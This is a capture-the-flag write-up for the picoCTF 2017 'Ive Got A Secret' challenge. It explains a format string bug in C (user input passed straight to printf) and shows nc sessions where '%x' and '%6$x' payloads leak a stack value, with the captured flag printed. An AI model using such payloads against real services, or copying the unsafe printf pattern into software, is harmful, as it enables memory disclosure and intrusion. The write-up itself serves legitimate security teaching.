# Ive Got A Secret

```
Hopefully you can find the right format for my secret! Source. Connect on shell2017.picoctf.com:58570.
HINTS
This is a beginning format string attack.
```

Looking at the main function, we can se 2 things. The value of secret is a local variable in the main function and a user string is directly printed using printf.

```C
int main(int argc, char** argv) {
    int fd = open("/dev/urandom", O_RDONLY);
    if(fd == -1){
        puts("Open error on /dev/urandom. Contact an admin\n");
        return -1;
    }
    int secret;
    ...
    
    ...
    fgets(buffer, BUF_LEN, stdin);
    printf(buffer);
    ...

    ...
    return 0;
}

```

When printf is given a specified to print out a decimal, float, hex number, pointer, or some other value of that type (basically not a string), it looks to the stack for the arguments that should have been passed to it. If nothing is there, it simply prints the value from the given position on the stack and increments the stack pointer. In this case it turns out that the value for secret is the sixth element on the stack during the call to printf. Therefore if we just give the program 6 %x's we will see the value of the secret and can then input that value and get a shell. This one gives us the flag, we don't even have to cat it.

```
$ nc shell2017.picoctf.com 58570
Give me something to say!
%x.%x.%x.%x.%x.%x
40.f7fc7c20.8048792.1.ffffdd34.d3e8ae6e
Now tell my secret in hex! Secret: d3e8ae6e
326edd4743c7046d72d29e911ae8a412
Wow, you got it!
$ ls
README.md  secret  secret.c
$
```

This solution works but a slightly more elegant method uses the $ operator in format string to directly reference the 6th argument that should have been passed to printf, rather, the 6th element on the stack, the value of secret.

```
$ nc shell2017.picoctf.com 58570
Give me something to say!
%6$x
bb37c7c1
Now tell my secret in hex! Secret: bb37c7c1
326edd4743c7046d72d29e911ae8a412
Wow, you got it!
$
```


